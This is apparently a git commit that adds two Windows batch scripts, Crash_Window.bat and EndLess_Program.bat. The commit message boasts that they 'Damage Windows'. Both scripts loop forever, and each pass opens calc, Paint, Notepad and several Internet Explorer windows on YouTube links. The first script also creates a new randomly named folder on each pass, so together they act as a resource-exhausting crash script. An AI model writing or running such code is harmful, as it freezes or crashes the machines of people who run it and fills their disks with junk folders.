6d91c51f7bbba3db8a0b15cb7ef00f7568a5d494
Likhit Budwal <lbudwal6@gmail.com>
2018-06-24 17:23:03 -0700

    These Files Damage Windows Open in Notepad first
    Damage window!!!!!!!!!!!!!!!!!!!!!!!!!!

---
+++ Crash_Window.bat
@@ -0,0 +1,17 @@
+@echo off
+
+ :pro
+
+
+md %random%
+/folder.
+ start calc
+ start mspaint
+ start notepad
+ start iexplore.exe
+ start iexplore.exe "https://www.youtube.com/watch?v=9H_er7dqBts" 
+ start iexplore.exe "https://www.youtube.com/watch?v=tbXhvBUKN_Y"
+ start iexplore.exe "https://www.youtube.com/watch?v=OsEVqwStshI"
+
+
+ goto pro
---
+++ EndLess_Program.bat
@@ -0,0 +1,11 @@
+@echo off
+ :pro
+ start calc
+ start mspaint
+ start notepad
+ start iexplore.exe
+ start iexplore.exe "https://www.youtube.com/watch?v=9H_er7dqBts" 
+ start iexplore.exe "https://www.youtube.com/watch?v=tbXhvBUKN_Y"
+ start iexplore.exe "https://www.youtube.com/watch?v=OsEVqwStshI"
+
+ goto pro
